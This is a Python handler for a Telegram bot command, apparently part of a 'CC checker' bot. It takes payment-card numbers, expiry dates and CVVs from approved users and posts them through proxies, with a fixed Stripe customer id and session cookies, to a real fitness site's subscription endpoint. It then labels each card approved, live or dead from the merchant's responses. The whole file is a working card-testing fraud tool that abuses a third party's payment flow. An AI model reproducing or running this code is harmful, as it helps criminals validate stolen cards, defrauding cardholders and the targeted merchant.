from configs._def_main_ import *
from pluss.gate.defgate.defch import *

@rex('ch')
@atspam
async def start(client,msg):
    with open(file='db text/user.txt', mode='r+', encoding='utf-8') as archivo:
        dbx = archivo.readlines()
        if str(msg.from_user.id) + '\n' in dbx:
            ccsa = msg.text[len('/ch '):]
            msg1 = await msg.reply(f'<b>[•]  <a href="tg://user?id=InefableRexBot">Stripe charged 「︎⚡️」︎</a>\n[•] <code>{ccsa}</code>\n-\n[•] chk ⇾ {msg.from_user.first_name}</b>')

            if not ccsa: return await msg1.edit('<b>Ingrese la cc <code>.ch cc</code></b>')
            ccs = ccsa.split("|")
            cc = ccs[0]
            mes = ccs[1]
            ano1 = int(ccs[2])
            ano = ano1 % 100
            cvv = ccs[3]

            data = {
                    'stripe_customer': 'cus_NvMJFgzYAEWFXw',
                    'subscription_type': 'Weekly Subscription',
                    'id': '3577',
                    'firstname': first,
                    'lastname': last,
                    'email': mail,
                    'card[name]': first,
                    'card[number]': cc,
                    'card[exp_month]': mes,
                    'card[exp_year]': ano,
                    'card[cvc]': cvv,
                    'coupon': '',
                }

            response = ssesion.post('https://www.lagreeod.com/register/validate_subscribe_logged',cookies=cookies,     headers=headers,data=data,proxies=proxya)

            if '"success":true' in response.text:
                ms = chres.format(ccs=ccsa,stat=char,respo=aproved,message=aproved,code=sst,name=msg.from_user.first_name)
                await msg1.edit(ms)

            elif "Your card has insufficient funds." in response.text:
                message = response.json()['message']
                code = response.json()['code']
                ms = chres.format(ccs=ccsa,stat=livecc,respo=aproved,message=message,code=fund,name=msg.from_user.first_name)
                await msg1.edit(ms)

            elif"Your card's security code is incorrect." in response.text:
                message = response.json()['message']
                code = response.json()['code']
                ms = chres.format(ccs=ccsa,stat=livecc,respo=ccn,message=message,code=code,name=msg.from_user.first_name)
                await msg1.edit(ms)
                
            elif 'success":false' in response.text:
                message = response.json()['message']
                code = response.json()['code']
                ms = chres.format(ccs=ccsa,stat=cad,respo=deadcc,message=message,code=code,name=msg.from_user.first_name)       
                await msg1.edit(ms)

            else:
                ms = chres.format(ccs=ccsa,stat=cad,respo=deadcc,message=inco,code=ereq,name=msg.from_user.first_name)
                await msg1.edit(ms)
        else:return await msg.reply(controndb,reply_markup=dbre)